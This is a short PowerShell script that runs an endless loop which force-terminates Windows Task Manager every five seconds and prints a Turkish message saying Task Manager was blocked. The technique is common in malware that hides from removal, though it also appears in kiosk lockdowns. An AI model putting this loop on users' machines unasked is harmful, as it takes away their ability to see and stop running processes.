while ($true) {
    try {
        $processes = Get-Process -Name Taskmgr -ErrorAction SilentlyContinue
        if ($processes) {
            Stop-Process -Name Taskmgr -Force -ErrorAction SilentlyContinue
            Write-Host "⚠️ Görev Yöneticisi engellendi!" -ForegroundColor Red
        }
    } catch {}
    Start-Sleep -Seconds 5
}